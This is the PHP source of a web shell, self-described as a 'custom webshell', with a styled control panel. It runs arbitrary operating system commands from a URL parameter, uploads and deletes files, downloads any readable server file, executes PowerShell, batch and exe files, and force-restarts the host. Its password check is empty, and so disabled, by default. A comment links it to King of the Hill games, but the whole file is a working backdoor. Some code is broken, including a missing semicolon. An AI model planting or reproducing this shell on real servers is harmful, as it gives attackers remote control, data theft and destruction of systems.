<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php
    // Password protection, useful for King of The Hill games
    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.

        global $cmdresults;
        global $retval;
    if($pass != null) {
        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }

    function getAbsolute(string $path): string
    {
        // Cleaning path regarding OS
        $path = mb_ereg_replace('\\\\|/', '/', $path, 'msr');
        // Check if path start with a separator (UNIX)
        $startWithSeparator = $path[0] === '/';
        // Check if start with drive letter
        preg_match('/^[a-z]:/', $path, $matches);
        $startWithLetterDir = isset($matches[0]) ? $matches[0] : false;
        // Get and filter empty sub paths
        $subPaths = array_filter(explode('/', $path), 'mb_strlen');

        $absolutes = [];
        foreach ($subPaths as $subPath) {
            if ('.' === $subPath) {
                continue;
            }
            // if $startWithSeparator is false
            // and $startWithLetterDir
            // and (absolutes is empty or all previous values are ..)
            // save absolute cause that's a relative and we can't deal with that and just forget that we want go up
            if ('..' === $subPath
                && !$startWithSeparator
                && !$startWithLetterDir
                && empty(array_filter($absolutes, function ($value) { return !('..' === $value); }))
            ) {
                $absolutes[] = $subPath;
                continue;
            }
            if ('..' === $subPath) {
                array_pop($absolutes);
                continue;
            }
            $absolutes[] = $subPath;
        }

        return
            (($startWithSeparator ? '/' : $startWithLetterDir) ?
                $startWithLetterDir.'/' : ''
            ).implode('/', $absolutes);
    }

    if (isset($_POST['s_action'])) {
        $actionname = $_POST['s_action'];
        $encodedreport = $_POST['s_encodedreport'];
        $decodedreport = html_entity_decode($encodedreport);

        $scriptPath = ''
        $command = 'pwsh -Noni -Nop -File "' . $scriptPath . '"';
        echo "=======================================================\n" ; echo "<br>";
        echo "actionname $actionname" ; echo "<br>";
        echo "encodedreport $encodedreport" ; echo "<br>";
        echo "decodedreport $decodedreport" ; echo "<br>";
        echo "=======================================================\n" ; echo "<br>";
        return;
    }
    else if (isset($_POST['upload'])) {
        $desinationDir = getDir();
        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);

        if (file_exists($destinationFile)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $script = $_GET['runscript'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -File "' . $scriptPath . '"';
        global $cmdresults;
        global $retval;
        $cmdresults = shell_exec($command);
    }
    else if (isset($_GET['runexe'])) {
        $script = $_GET['runexe'];
        $scriptPath = getAbsolute($script);
        $command = $scriptPath;
        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
    }
    else if (isset($_GET['runbat'])) {
        $script = $_GET['runbat'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $scriptPath . ') }';
        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
    }
    else if (isset($_GET['delete'])) {
        $script = $_GET['delete'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -Command "& { Write-Output "Deleting file "'. $scriptPath . '"; $Null = Remove-Item -Path "' . $scriptPath . '" -Force -ErrorAction Ignore }"';
        global $cmdresults;
        global $retval;
        $cmdresults[0] = shell_exec($command);
    }
    else if (isset($_GET['quickaction'])) {
        $action = $_GET['quickaction'];
        switch ($action) {
          case "restart":
        	$command = 'pwsh -noni -nop -Command "& {Restart-Computer -Force}"';
        	$cmdresults = shell_exec($command);
            break;
          default:
            break;
        }
    }
    // Download a file from the server
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file)) {
            if (is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($file));
                readfile($file);
                exit;
            } else {
                echo "<script>alert('Error: Could not read the file !')</script>";
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getThirdColor(){
        return '#d0d0d0';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($level){
        switch ($level) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($name) {
        $n = strrpos($name, '.');
        return ($n === false) ? '' : substr($name, $n+1);
    }
    function getItemSize($filename) {
        $retval =  '';
        $fname = getDir().'/'.$filename;
        if (is_dir($fname)){  
            $retval .=  '<td style="color: "' .  getDirectoryColor() . '">';
            $retval .= htmlspecialchars('<dir>');
        }
        else{
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retsize = formatSizeUnits(filesize($fname));
            $retval .= $retsize;
        }
        $retval .= '</td>';
        return $retval;
    }
    function getItemZeroAction($filename) {
        $retval =  '';
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        $retval .=  '<td style="color: "' .  getThirdColor() . '"> n/a </td>';
        return $retval;
    }
    function getItemActions($filename) {
        $retval =  '';
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
   
        
        if(is_dir($filename)){
            echo "\n<!-- DEBUG $filename isaDir TRUE -->\n";
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= makeZipArchive($filename);
        }else{
            echo "\n<!-- DEBUG $filename isaDir FALSE -->\n";
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= makeDeleteFile($filename);
        }
        switch ($ext) {
          case "ps1":
            //$retval .=  getSecondaryColor();
            $retval .= makeRunScriptFile($filename);
            break;
          case "bat":
           // $retval .= getSecondaryColor();
            $retval .= makeRunBatFile($filename);
            break;
          case "exe":
            //$retval .= getSecondaryColor();
            $retval .= makeRunExeFile($filename);
            break;
          default:

        }

        $retval .= '</td>';
        return $retval;
    }
    function printPerms($file) {
        $mode = fileperms($file);
        if( $mode & 0x1000 ) { $type='p'; }
        else if( $mode & 0x2000 ) { $type='c'; }
        else if( $mode & 0x4000 ) { $type='d'; }
        else if( $mode & 0x6000 ) { $type='b'; }
        else if( $mode & 0x8000 ) { $type='-'; }
        else if( $mode & 0xA000 ) { $type='l'; }
        else if( $mode & 0xC000 ) { $type='s'; }
        else $type='u';
        $owner["read"] = ($mode & 00400) ? 'r' : '-';
        $owner["write"] = ($mode & 00200) ? 'w' : '-';
        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
        $group["read"] = ($mode & 00040) ? 'r' : '-';
        $group["write"] = ($mode & 00020) ? 'w' : '-';
        $group["execute"] = ($mode & 00010) ? 'x' : '-';
        $world["read"] = ($mode & 00004) ? 'r' : '-';
        $world["write"] = ($mode & 00002) ? 'w' : '-';
        $world["execute"] = ($mode & 00001) ? 'x' : '-';
        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
        $s=sprintf("%1s", $type);
        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
        return $s;
    }

    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($file) {
        if (is_dir(getDir().'/'.$file)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        }
    }
    function makeRunScriptFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
    }
    function makeRunExeFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
    }
    function makeDeleteFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?delete='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'del </a>';
    }
    function makeRunBatFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
    }
    function makeZipArchive($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?zipdir='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'zip </a>';
    }
    function getFiles() {
        $files = scandir(getDir());

        $even = true;
        if ($files != null) {
            foreach($files as $filename){
                //Simply print them out onto the screen.
                echo '<tr style="background-color:'.($even  ? '#515151' : '#212121').';">';
                echo '<td style="font-weight:thin;">'.makeFileName($filename).'</td>'; 
                //echo '<td>owner</td>';
                //echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
                $fileFullPath = getDir().'/'.$filename;
                if(is_dir($fileFullPath)){
                    $fileFullPath = getDir().'/'.$filename;
                }else{
                    $fileFullPath = $filename;
                }
                echo ''.getItemSize($filename).'';
                if ($filename == '..' || $filename == '.'){
                    echo ''.getItemZeroAction($fileFullPath).'';
                }else{
                    echo ''.getItemActions($fileFullPath).'';
                }
                echo '</tr>';
                $even = !$even;
            }
        } else {
            echo "<p>Couldn't open that directory !";
        }
    }

    function getCmdResults() {
        global $cmdresults;
        global $retval;
        
        if ($retval == 0 ) {
            if($cmdresults != null){
                foreach ($cmdresults as $line) {

                    if($line != null){
                        echo "<br>";
                        echo htmlspecialchars($line);
                        echo "\n";
                        
                    }
                }
            }
        } else {
            echo "Execution failed with error code: ".$retval;
        }    
    }

    function getCommandLine() {
        $hostname = gethostname() ?? 'none';
        $username = get_current_user();
        $dir = getDir();
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '<span style="color: #ff6347">'.$username.'@'.$hostname.'</span>: <span style="color: #B40404">'.$dir.'</span>$ '.$cmd;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
            function confirmOperation() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo getHeaderColor();?>;
                --background-color-1: <?php echo getBgColor(1);?>;
                --background-color-2: <?php echo getBgColor(2);?>;
                --background-color-3: <?php echo getBgColor(3);?>;
                --background-color-4: <?php echo getBgColor(4);?>;
                --primary-color: <?php echo getPrimaryColor();?>;
                --secondary-color: <?php echo getSecondaryColor();?>;
                --command-color: <?php echo getCommandColor();?>;
                --commandoutput-color: <?php echo getCommandOutputColor();?>;
                --explorer-color: <?php echo getExplorerColor();?>;
                --directory-color: <?php echo getDirectoryColor();?>;
                --navtext-color: <?php echo getNavTextColor();?>;
                --navtext-hover-color: <?php echo getNavTextHoverColor();?>;
                --header-text-color: <?php echo getHeaderTextColor();?>;
                --buttons-color: <?php echo getButtonsColor();?>;
            }
        </style>
        <script>
            const popupHtmlConfirm = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>HARD REBOOT OF COMPUTER RIGHT NOW!</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir().'&quickaction=restart' ?>" method="POST" enctype="multipart/form-data">
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="confirm" name="confirm">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function loadUrl(newLocation)
            {
                window.location = newLocation;
                return false;
            }
            function showConfirmPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlConfirm + bodyHTML;
            }
            function showUploadPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function showRunScriptPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1><?php echo $_SERVER['HTTP_HOST']; ?> >> control panel </h1>
                <div class="nav-items">
                	<a onclick="showConfirmPopup()">[restart now]</a>
                    <a onclick="showUploadPopup()">[upload]</a>
                    <a onclick="changeDir()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>



